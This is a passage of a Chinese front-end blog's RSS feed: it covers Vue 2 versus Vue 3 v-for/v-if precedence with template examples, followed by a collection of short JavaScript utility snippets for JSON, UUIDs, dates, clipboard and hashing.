<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><ul>
<li><a href="https://github1s.com/vuejs/vue/blob/v2.6.14/src/compiler/index.js" target="_blank" rel="noopener noreferrer">src/compiler/index</a></li>
</ul>
<h2 id="_7-v-for-与-v-if"> 7. v-for 与 v-if</h2>
<ul>
<li>
<p>由于在 Vue2 中 v-for 的优先级高于 v-if，当 v-for 与 v-if 连用时会存在性能浪费（<a href="https://github.com/vuejs/vue/blob/v2.6.14/src/compiler/codegen/index.js#L65-L68" target="_blank" rel="noopener noreferrer">src/compiler/codegen/index</a>）。</p>
</li>
<li>
<p>Vue3 中 v-if 的优先级高于 v-for，无此问题。（<a href="https://github.com/vuejs/vue-next/blob/v3.2.26/packages/compiler-core/src/compile.ts#L33-L35" target="_blank" rel="noopener noreferrer">packages/compiler-core/src/compile</a>）。</p>
</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>
    <span>&lt;!-- bad --></span>
    <span><span><span>&lt;</span>ul</span><span>></span></span>
      <span><span><span>&lt;</span>li</span> <span>v-for</span><span><span>=</span><span>"</span>(item, index) in list<span>"</span></span> <span>v-if</span><span><span>=</span><span>"</span>index % 2<span>"</span></span><span>></span></span>
        {{ item }}
      <span><span><span>&lt;/</span>li</span><span>></span></span>
    <span><span><span>&lt;/</span>ul</span><span>></span></span>

    <span>&lt;!-- good --></span>
    <span><span><span>&lt;</span>ul</span><span>></span></span>
      <span><span><span>&lt;</span>li</span> <span>v-for</span><span><span>=</span><span>"</span>(item, index) in filterList<span>"</span></span><span>></span></span>
        {{ item }}
      <span><span><span>&lt;/</span>li</span><span>></span></span>
    <span><span><span>&lt;/</span>ul</span><span>></span></span>

    <span>&lt;!-- bad --></span>
    <span><span><span>&lt;</span>ul</span><span>></span></span>
      <span><span><span>&lt;</span>li</span> <span>v-for</span><span><span>=</span><span>"</span>(item, index) in list<span>"</span></span> <span>v-if</span><span><span>=</span><span>"</span>visible<span>"</span></span><span>></span></span>
        {{ item }}
      <span><span><span>&lt;/</span>li</span><span>></span></span>
    <span><span><span>&lt;/</span>ul</span><span>></span></span>

    <span>&lt;!-- good --></span>
    <span><span><span>&lt;</span>ul</span><span>></span></span>
      <span><span><span>&lt;</span>template</span> <span>v-if</span><span><span>=</span><span>"</span>visible<span>"</span></span><span>></span></span>
        <span><span><span>&lt;</span>li</span> <span>v-for</span><span><span>=</span><span>"</span>(item, index) in list<span>"</span></span><span>></span></span>
          {{ item }}
        <span><span><span>&lt;/</span>li</span><span>></span></span>
      <span><span><span>&lt;/</span>template</span><span>></span></span>
    <span><span><span>&lt;/</span>ul</span><span>></span></span>
  <span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>list</span><span>:</span> <span>Array</span><span>(</span><span>100</span><span>)</span>
        <span>.</span><span>fill</span><span>(</span><span>0</span><span>)</span>
        <span>.</span><span>map</span><span>(</span><span>(</span><span>_<span>,</span> index</span><span>)</span> <span>=></span> index<span>)</span><span>,</span>
      <span>visible</span><span>:</span> <span>false</span><span>,</span>
    <span>}</span>
  <span>}</span><span>,</span>
  <span>computed</span><span>:</span> <span>{</span>
    <span>filterList</span><span>(</span><span><span>{</span> list <span>}</span></span><span>)</span> <span>{</span>
      <span>return</span> list<span>.</span><span>filter</span><span>(</span><span>(</span><span>_<span>,</span> index</span><span>)</span> <span>=></span> index <span>%</span> <span>2</span><span>)</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br></div></div>
]]></content:encoded>
    </item>
    <item>
      <title>30 秒代码</title>
      <link>https://www.matrixtheone.ga/web/note/30SecondCode/</link>
      <guid>https://www.matrixtheone.ga/web/note/30SecondCode/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">30 秒代码</source>
      <category>30 秒代码</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-写入-json"> 1. 写入 JSON</h2>
<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>'fs'</span><span>)</span>

<span>const</span> <span>JSONToFile</span> <span>=</span> <span>(</span><span>obj<span>,</span> filename</span><span>)</span> <span>=></span>
  fs<span>.</span><span>writeFileSync</span><span>(</span><span><span>`</span><span><span>${</span>filename<span>}</span></span><span>.json</span><span>`</span></span><span>,</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span>obj<span>,</span> <span>null</span><span>,</span> <span>2</span><span>)</span><span>)</span>

<span>JSONToFile</span><span>(</span><span>{</span> <span>test</span><span>:</span> <span>'is passed'</span> <span>}</span><span>,</span> <span>'testJsonFile'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_2-浏览器端生成-uuid"> 2. 浏览器端生成 UUID</h2>
<div><pre><code><span>const</span> <span>UUIDGeneratorBrowser</span> <span>=</span> <span>(</span><span>)</span> <span>=></span>
  <span>(</span><span>[</span><span>1e7</span><span>]</span> <span>+</span> <span>-</span><span>1e3</span> <span>+</span> <span>-</span><span>4e3</span> <span>+</span> <span>-</span><span>8e3</span> <span>+</span> <span>-</span><span>1e11</span><span>)</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>[018]</span><span>/</span><span>g</span></span><span>,</span> <span>c</span> <span>=></span>
    <span>(</span>
      c <span>^</span>
      <span>(</span>crypto<span>.</span><span>getRandomValues</span><span>(</span><span>new</span> <span>Uint8Array</span><span>(</span><span>1</span><span>)</span><span>)</span><span>[</span><span>0</span><span>]</span> <span>&amp;</span> <span>(</span><span>15</span> <span>>></span> <span>(</span>c <span>/</span> <span>4</span><span>)</span><span>)</span><span>)</span>
    <span>)</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span>
  <span>)</span>

<span>UUIDGeneratorBrowser</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_3-fibonacci-列表"> 3. Fibonacci 列表</h2>
<div><pre><code><span>const</span> <span>accumulate</span> <span>=</span> <span>(</span><span><span>...</span>nums</span><span>)</span> <span>=></span>
  nums<span>.</span><span>reduce</span><span>(</span><span>(</span><span>acc<span>,</span> n</span><span>)</span> <span>=></span> <span>[</span><span>...</span>acc<span>,</span> n <span>+</span> <span>+</span>acc<span>.</span><span>slice</span><span>(</span><span>-</span><span>1</span><span>)</span><span>]</span><span>,</span> <span>[</span><span>]</span><span>)</span>

<span>accumulate</span><span>(</span><span>...</span><span>new</span> <span>Array</span><span>(</span><span>100</span><span>)</span><span>.</span><span>fill</span><span>(</span><span>''</span><span>)</span><span>.</span><span>map</span><span>(</span><span>(</span><span>item<span>,</span> index</span><span>)</span> <span>=></span> index <span>+</span> <span>1</span><span>)</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_4-单词首字母大写"> 4. 单词首字母大写</h2>
<div><pre><code><span>const</span> <span>capitalizeEveryWord</span> <span>=</span> <span>str</span> <span>=></span>
  str<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>\b[a-z]</span><span>/</span><span>g</span></span><span>,</span> <span>char</span> <span>=></span> char<span>.</span><span>toUpperCase</span><span>(</span><span>)</span><span>)</span>

<span>capitalizeEveryWord</span><span>(</span><span>'hello world!'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_5-摄氏度转华氏度"> 5. 摄氏度转华氏度</h2>
<div><pre><code><span>const</span> <span>celsiusToFahrenheit</span> <span>=</span> <span>degrees</span> <span>=></span> <span>1.8</span> <span>*</span> degrees <span>+</span> <span>32</span>

<span>celsiusToFahrenheit</span><span>(</span><span>33</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_6-华氏度转换摄氏度"> 6. 华氏度转换摄氏度</h2>
<div><pre><code><span>const</span> <span>fahrenheitToCelsius</span> <span>=</span> <span>degrees</span> <span>=></span> <span>(</span><span>(</span>degrees <span>-</span> <span>32</span><span>)</span> <span>*</span> <span>5</span><span>)</span> <span>/</span> <span>9</span>

<span>fahrenheitToCelsius</span><span>(</span><span>32</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_7-克隆正则"> 7. 克隆正则</h2>
<div><pre><code><span>const</span> <span>cloneRegExp</span> <span>=</span> <span>regExp</span> <span>=></span> <span>new</span> <span>RegExp</span><span>(</span>regExp<span>.</span>source<span>,</span> regExp<span>.</span>flags<span>)</span>

<span>const</span> regExp <span>=</span> <span><span>/</span><span>lorem ipsum</span><span>/</span><span>gi</span></span>
<span>const</span> regExp2 <span>=</span> <span>cloneRegExp</span><span>(</span>regExp<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_8-过滤数组-对象中的空值"> 8. 过滤数组 | 对象中的空值</h2>
<div><pre><code><span>const</span> <span>compactObject</span> <span>=</span> <span>val</span> <span>=></span> <span>{</span>
  <span>const</span> data <span>=</span> Array<span>.</span><span>isArray</span><span>(</span>val<span>)</span> <span>?</span> val<span>.</span><span>filter</span><span>(</span>Boolean<span>)</span> <span>:</span> val
  <span>return</span> Object<span>.</span><span>keys</span><span>(</span>data<span>)</span><span>.</span><span>reduce</span><span>(</span>
    <span>(</span><span>acc<span>,</span> key</span><span>)</span> <span>=></span> <span>{</span>
      <span>const</span> value <span>=</span> data<span>[</span>key<span>]</span>
      <span>if</span> <span>(</span><span>Boolean</span><span>(</span>value<span>)</span><span>)</span>
        acc<span>[</span>key<span>]</span> <span>=</span> <span>typeof</span> value <span>===</span> <span>'object'</span> <span>?</span> <span>compactObject</span><span>(</span>value<span>)</span> <span>:</span> value
      <span>return</span> acc
    <span>}</span><span>,</span>
    Array<span>.</span><span>isArray</span><span>(</span>val<span>)</span> <span>?</span> <span>[</span><span>]</span> <span>:</span> <span>{</span><span>}</span>
  <span>)</span>
<span>}</span>

<span>const</span> obj <span>=</span> <span>{</span>
  <span>a</span><span>:</span> <span>null</span><span>,</span>
  <span>b</span><span>:</span> <span>false</span><span>,</span>
  <span>c</span><span>:</span> <span>true</span><span>,</span>
  <span>d</span><span>:</span> <span>0</span><span>,</span>
  <span>e</span><span>:</span> <span>1</span><span>,</span>
  <span>f</span><span>:</span> <span>''</span><span>,</span>
  <span>g</span><span>:</span> <span>'a'</span><span>,</span>
  <span>h</span><span>:</span> <span>[</span><span>null</span><span>,</span> <span>false</span><span>,</span> <span>''</span><span>,</span> <span>true</span><span>,</span> <span>1</span><span>,</span> <span>'a'</span><span>]</span><span>,</span>
  <span>i</span><span>:</span> <span>{</span> <span>j</span><span>:</span> <span>0</span><span>,</span> <span>k</span><span>:</span> <span>false</span><span>,</span> <span>l</span><span>:</span> <span>'a'</span> <span>}</span><span>,</span>
<span>}</span>
<span>compactObject</span><span>(</span>obj<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h2 id="_9-复制内容至剪切板"> 9. 复制内容至剪切板</h2>
<div><pre><code><span>const</span> <span>copyToClipboard</span> <span>=</span> <span>str</span> <span>=></span> <span>{</span>
  <span>const</span> el <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'textarea'</span><span>)</span>
  el<span>.</span>value <span>=</span> str
  el<span>.</span><span>setAttribute</span><span>(</span><span>'readonly'</span><span>,</span> <span>''</span><span>)</span>
  el<span>.</span>style<span>.</span>position <span>=</span> <span>'absolute'</span>
  el<span>.</span>style<span>.</span>left <span>=</span> <span>'-9999px'</span>
  document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>el<span>)</span>
  <span>const</span> selected <span>=</span>
    document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span>rangeCount <span>></span> <span>0</span>
      <span>?</span> document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span><span>getRangeAt</span><span>(</span><span>0</span><span>)</span>
      <span>:</span> <span>false</span>
  el<span>.</span><span>select</span><span>(</span><span>)</span>
  document<span>.</span><span>execCommand</span><span>(</span><span>'copy'</span><span>)</span>
  document<span>.</span>body<span>.</span><span>removeChild</span><span>(</span>el<span>)</span>
  <span>if</span> <span>(</span>selected<span>)</span> <span>{</span>
    document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span><span>removeAllRanges</span><span>(</span><span>)</span>
    document<span>.</span><span>getSelection</span><span>(</span><span>)</span><span>.</span><span>addRange</span><span>(</span>selected<span>)</span>
  <span>}</span>
<span>}</span>

<span>copyToClipboard</span><span>(</span><span>'Lorem ipsum'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><h2 id="_10-复制内容至剪切板-新-api"> 10. 复制内容至剪切板 (新 API)</h2>
<div><pre><code><span>var</span> data <span>=</span> <span>new</span> <span>DataTransfer</span><span>(</span><span>)</span>
data<span>.</span>items<span>.</span><span>add</span><span>(</span><span>'Howdy, partner!'</span><span>,</span> <span>'text/plain'</span><span>)</span>
data<span>.</span>items<span>.</span><span>add</span><span>(</span><span>'&lt;b>Howdy&lt;/b>, partner!'</span><span>,</span> <span>'text/html'</span><span>)</span>
navigator<span>.</span>clipboard<span>.</span><span>write</span><span>(</span>data<span>)</span>

navigator<span>.</span>clipboard<span>.</span><span>writeText</span><span>(</span><span>'some text'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_11-计算元素在数组中出现的次数"> 11. 计算元素在数组中出现的次数</h2>
<div><pre><code><span>const</span> <span>countBy</span> <span>=</span> <span>(</span><span>arr<span>,</span> fn</span><span>)</span> <span>=></span>
  arr<span>.</span><span>map</span><span>(</span><span>typeof</span> fn <span>===</span> <span>'function'</span> <span>?</span> <span>fn</span> <span>:</span> <span>val</span> <span>=></span> val<span>[</span>fn<span>]</span><span>)</span><span>.</span><span>reduce</span><span>(</span><span>(</span><span>acc<span>,</span> val</span><span>)</span> <span>=></span> <span>{</span>
    acc<span>[</span>val<span>]</span> <span>=</span> <span>(</span>acc<span>[</span>val<span>]</span> <span>||</span> <span>0</span><span>)</span> <span>+</span> <span>1</span>
    <span>return</span> acc
  <span>}</span><span>,</span> <span>{</span><span>}</span><span>)</span>

<span>countBy</span><span>(</span><span>[</span><span>6.1</span><span>,</span> <span>4.2</span><span>,</span> <span>6.3</span><span>]</span><span>,</span> Math<span>.</span>floor<span>)</span>
<span>countBy</span><span>(</span><span>[</span><span>'one'</span><span>,</span> <span>'two'</span><span>,</span> <span>'three'</span><span>]</span><span>,</span> <span>'length'</span><span>)</span>
<span>countBy</span><span>(</span><span>[</span><span>{</span> <span>count</span><span>:</span> <span>5</span> <span>}</span><span>,</span> <span>{</span> <span>count</span><span>:</span> <span>10</span> <span>}</span><span>,</span> <span>{</span> <span>count</span><span>:</span> <span>5</span> <span>}</span><span>]</span><span>,</span> <span>x</span> <span>=></span> x<span>.</span>count<span>)</span>

<span>const</span> <span>frequencies</span> <span>=</span> <span>arr</span> <span>=></span>
  arr<span>.</span><span>reduce</span><span>(</span><span>(</span><span>a<span>,</span> v</span><span>)</span> <span>=></span> <span>{</span>
    a<span>[</span>v<span>]</span> <span>=</span> a<span>[</span>v<span>]</span> <span>?</span> a<span>[</span>v<span>]</span> <span>+</span> <span>1</span> <span>:</span> <span>1</span>
    <span>return</span> a
  <span>}</span><span>,</span> <span>{</span><span>}</span><span>)</span>

<span>frequencies</span><span>(</span><span>[</span><span>'a'</span><span>,</span> <span>'b'</span><span>,</span> <span>'a'</span><span>,</span> <span>'c'</span><span>,</span> <span>'a'</span><span>,</span> <span>'a'</span><span>,</span> <span>'b'</span><span>]</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><h2 id="_12-获取星期"> 12. 获取星期</h2>
<div><pre><code><span>const</span> <span>dayName</span> <span>=</span> <span>(</span><span>date<span>,</span> locale</span><span>)</span> <span>=></span>
  date<span>.</span><span>toLocaleDateString</span><span>(</span>locale<span>,</span> <span>{</span> <span>weekday</span><span>:</span> <span>'long'</span> <span>}</span><span>)</span>

<span>dayName</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span>
<span>dayName</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>'09/23/2020'</span><span>)</span><span>,</span> <span>'de-DE'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_13-获取当前为今年的第几天"> 13. 获取当前为今年的第几天</h2>
<div><pre><code><span>const</span> <span>dayOfYear</span> <span>=</span> <span>date</span> <span>=></span>
  Math<span>.</span><span>floor</span><span>(</span><span>(</span>date <span>-</span> <span>new</span> <span>Date</span><span>(</span>date<span>.</span><span>getFullYear</span><span>(</span><span>)</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>)</span><span>)</span> <span>/</span> <span>1000</span> <span>/</span> <span>60</span> <span>/</span> <span>60</span> <span>/</span> <span>24</span><span>)</span>

<span>dayOfYear</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_14-获取当前过去-未来-n-天数的时间"> 14. 获取当前过去 | 未来 n 天数的时间</h2>
<div><pre><code><span>const</span> <span>daysAgo</span> <span>=</span> <span>n</span> <span>=></span> <span>{</span>
  <span>let</span> d <span>=</span> <span>new</span> <span>Date</span><span>(</span><span>)</span>
  d<span>.</span><span>setDate</span><span>(</span>d<span>.</span><span>getDate</span><span>(</span><span>)</span> <span>-</span> Math<span>.</span><span>abs</span><span>(</span>n<span>)</span><span>)</span>
  <span>return</span> d<span>.</span><span>toISOString</span><span>(</span><span>)</span><span>.</span><span>split</span><span>(</span><span>'T'</span><span>)</span><span>[</span><span>0</span><span>]</span>
<span>}</span>

<span>const</span> <span>daysFromNow</span> <span>=</span> <span>n</span> <span>=></span> <span>{</span>
  <span>let</span> d <span>=</span> <span>new</span> <span>Date</span><span>(</span><span>)</span>
  d<span>.</span><span>setDate</span><span>(</span>d<span>.</span><span>getDate</span><span>(</span><span>)</span> <span>+</span> Math<span>.</span><span>abs</span><span>(</span>n<span>)</span><span>)</span>
  <span>return</span> d<span>.</span><span>toISOString</span><span>(</span><span>)</span><span>.</span><span>split</span><span>(</span><span>'T'</span><span>)</span><span>[</span><span>0</span><span>]</span>
<span>}</span>

<span>daysAgo</span><span>(</span><span>20</span><span>)</span>
<span>daysFromNow</span><span>(</span><span>5</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h2 id="_15-深度冻结对象"> 15. 深度冻结对象</h2>
<div><pre><code><span>const</span> <span>deepFreeze</span> <span>=</span> <span>obj</span> <span>=></span> <span>{</span>
  Object<span>.</span><span>keys</span><span>(</span>obj<span>)</span><span>.</span><span>forEach</span><span>(</span><span>prop</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span><span>typeof</span> obj<span>[</span>prop<span>]</span> <span>===</span> <span>'object'</span><span>)</span> <span>deepFreeze</span><span>(</span>obj<span>[</span>prop<span>]</span><span>)</span>
  <span>}</span><span>)</span>
  <span>return</span> Object<span>.</span><span>freeze</span><span>(</span>obj<span>)</span>
<span>}</span>

<span>;</span><span>(</span><span>'use strict'</span><span>)</span>

<span>const</span> val <span>=</span> <span>deepFreeze</span><span>(</span><span>[</span><span>1</span><span>,</span> <span>[</span><span>2</span><span>,</span> <span>3</span><span>]</span><span>]</span><span>)</span>

val<span>[</span><span>0</span><span>]</span> <span>=</span> <span>3</span> <span>// not allowed</span>
val<span>[</span><span>1</span><span>]</span><span>[</span><span>0</span><span>]</span> <span>=</span> <span>4</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_16-判端桌面端与移动端"> 16. 判端桌面端与移动端</h2>
<div><pre><code><span>const</span> <span>detectDeviceType</span> <span>=</span> <span>(</span><span>)</span> <span>=></span>
  <span><span>/</span><span>Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini</span><span>/</span><span>i</span></span><span>.</span><span>test</span><span>(</span>
    navigator<span>.</span>userAgent
  <span>)</span>
    <span>?</span> <span>'Mobile'</span>
    <span>:</span> <span>'Desktop'</span>

<span>detectDeviceType</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_17-数字分割"> 17. 数字分割</h2>
<div><pre><code><span>7777777.</span><span>.</span><span>toLocaleString</span><span>(</span><span>'en-US'</span><span>)</span>

<span>'7777777'</span><span>.</span><span>replace</span><span>(</span><span><span>/</span><span>(?=(\B)(\d{3})+$)</span><span>/</span><span>g</span></span><span>,</span> <span>','</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_18-提取域名"> 18. 提取域名</h2>
<div><pre><code><span>const</span> <span>getBaseURL</span> <span>=</span> <span>url</span> <span>=></span> url<span>.</span><span>replace</span><span>(</span><span><span>/</span><span>[?#].*$</span><span>/</span></span><span>,</span> <span>''</span><span>)</span>

<span>getBaseURL</span><span>(</span><span>'http://url.com/page?name=Adam&amp;surname=Smith'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_19-提取当前时间"> 19. 提取当前时间</h2>
<div><pre><code><span>const</span> <span>getColonTimeFromDate</span> <span>=</span> <span>date</span> <span>=></span> date<span>.</span><span>toTimeString</span><span>(</span><span>)</span><span>.</span><span>slice</span><span>(</span><span>0</span><span>,</span> <span>8</span><span>)</span>

<span>getColonTimeFromDate</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>)</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_20-计算时间差"> 20. 计算时间差</h2>
<div><pre><code><span>const</span> <span>getMonthsDiffBetweenDates</span> <span>=</span> <span>(</span><span>dateInitial<span>,</span> dateFinal</span><span>)</span> <span>=></span>
  Math<span>.</span><span>max</span><span>(</span>
    <span>(</span>dateFinal<span>.</span><span>getFullYear</span><span>(</span><span>)</span> <span>-</span> dateInitial<span>.</span><span>getFullYear</span><span>(</span><span>)</span><span>)</span> <span>*</span> <span>12</span> <span>+</span>
      dateFinal<span>.</span><span>getMonth</span><span>(</span><span>)</span> <span>-</span>
      dateInitial<span>.</span><span>getMonth</span><span>(</span><span>)</span><span>,</span>
    <span>0</span>
  <span>)</span>

<span>getMonthsDiffBetweenDates</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>'2017-12-13'</span><span>)</span><span>,</span> <span>new</span> <span>Date</span><span>(</span><span>'2018-04-29'</span><span>)</span><span>)</span>

<span>const</span> <span>getDaysDiffBetweenDates</span> <span>=</span> <span>(</span><span>dateInitial<span>,</span> dateFinal</span><span>)</span> <span>=></span>
  <span>(</span>dateFinal <span>-</span> dateInitial<span>)</span> <span>/</span> <span>(</span><span>1000</span> <span>*</span> <span>3600</span> <span>*</span> <span>24</span><span>)</span>

<span>getDaysDiffBetweenDates</span><span>(</span><span>new</span> <span>Date</span><span>(</span><span>'2017-12-13'</span><span>)</span><span>,</span> <span>new</span> <span>Date</span><span>(</span><span>'2017-12-22'</span><span>)</span><span>)</span>

<span>const</span> <span>getHoursDiffBetweenDates</span> <span>=</span> <span>(</span><span>dateInitial<span>,</span> dateFinal</span><span>)</span> <span>=></span>
  <span>(</span>dateFinal <span>-</span> dateInitial<span>)</span> <span>/</span> <span>(</span><span>1000</span> <span>*</span> <span>3600</span><span>)</span>

<span>getHoursDiffBetweenDates</span><span>(</span>
  <span>new</span> <span>Date</span><span>(</span><span>'2021-04-24 10:25:00'</span><span>)</span><span>,</span>
  <span>new</span> <span>Date</span><span>(</span><span>'2021-04-25 10:25:00'</span><span>)</span>
<span>)</span>

<span>const</span> <span>getMinutesDiffBetweenDates</span> <span>=</span> <span>(</span><span>dateInitial<span>,</span> dateFinal</span><span>)</span> <span>=></span>
  <span>(</span>dateFinal <span>-</span> dateInitial<span>)</span> <span>/</span> <span>(</span><span>1000</span> <span>*</span> <span>60</span><span>)</span>

<span>getMinutesDiffBetweenDates</span><span>(</span>
  <span>new</span> <span>Date</span><span>(</span><span>'2021-04-24 01:00:15'</span><span>)</span><span>,</span>
  <span>new</span> <span>Date</span><span>(</span><span>'2021-04-24 02:00:15'</span><span>)</span>
<span>)</span>

<span>const</span> <span>getSecondsDiffBetweenDates</span> <span>=</span> <span>(</span><span>dateInitial<span>,</span> dateFinal</span><span>)</span> <span>=></span>
  <span>(</span>dateFinal <span>-</span> dateInitial<span>)</span> <span>/</span> <span>1000</span>

<span>getSecondsDiffBetweenDates</span><span>(</span>
  <span>new</span> <span>Date</span><span>(</span><span>'2020-12-24 00:00:15'</span><span>)</span><span>,</span>
  <span>new</span> <span>Date</span><span>(</span><span>'2020-12-24 00:00:17'</span><span>)</span>
<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br></div></div><h2 id="_21-生成-hash"> 21. 生成 hash</h2>
<div><pre><code><span>const</span> <span>hashBrowser</span> <span>=</span> <span>val</span> <span>=></span>
  crypto<span>.</span>subtle
    <span>.</span><span>digest</span><span>(</span><span>'SHA-256'</span><span>,</span> <span>new</span> <span>TextEncoder</span><span>(</span><span>'utf-8'</span><span>)</span><span>.</span><span>encode</span><span>(</span>val<span>)</span><span>)</span>
    <span>.</span><span>then</span><span>(</span><span>h</span> <span>=></span> <span>{</span>
      <span>let</span> hexes <span>=</span> <span>[</span><span>]</span><span>,</span>
        view <span>=</span> <span>new</span> <span>DataView</span><span>(</span>h<span>)</span>
      <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> view<span>.</span>byteLength<span>;</span> i <span>+=</span> <span>4</span><span>)</span>
        hexes<span>.</span><span>push</span><span>(</span><span>(</span><span>'00000000'</span> <span>+</span> view<span>.</span><span>getUint32</span><span>(</span>i<span>)</span><span>.</span><span>toString</span><span>(</span><span>16</span><span>)</span><span>)</span><span>.</span><span>slice</span><span>(</span><span>-</span><span>8</span><span>)</span><span>)</span>
